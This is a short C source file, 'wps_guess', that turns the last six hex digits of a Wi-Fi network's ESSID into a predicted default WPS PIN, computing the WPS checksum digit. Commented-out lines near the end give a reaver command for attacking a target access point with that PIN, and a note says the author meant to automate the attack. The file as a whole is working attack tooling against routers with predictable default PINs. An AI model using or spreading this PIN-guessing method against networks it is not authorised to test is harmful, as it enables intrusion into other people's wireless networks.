#include <stdio.h>
#include <stdlib.h>

int main(int argc, char *argv[])
{

	int input=0;
	int initial_input = 0;
	int accum = 0;
	int wps_checksum=0;

	if (argc != 2)
	{
		printf("usage: wps_guess xxxxxx\n");
		printf("xxxxxx are the last 6 digits of the ESSID\n\n");
		return -1;
	}

	//input = atoi (argv[1]);
	sscanf(argv[1], "%x", &input);
	printf ( "%x converted to:\n1) %u (using u)\n 2) %d (using d)\n\n",input,input);
	input = input % 10000000; //make sure it s just 7 digits
	printf("reducing it to 7 digits: %d or %u \n\n",input,input);
	initial_input=input;

	accum = 0;
	while (input >0)
	{
		accum+=(3*(input%10));
		input/=10;
		accum+=(input%10);
		input/=10;
	}
	wps_checksum= (10-accum %10)%10;
	printf("The WPS checksum is : %d \n\n",wps_checksum);

	printf("WPS Pin is : %u%d\n\n\n", initial_input,wps_checksum);

	//printf("Now it s time to invoke reaver \n");
	//printf("reaver -i interface -b MacOfTargetAP -vv -p WPSpin\n");
	//printf("May the force be with you\n");
	//here be exec kai tromaktika pragmata na ginetai aftomata
	return 0;
}
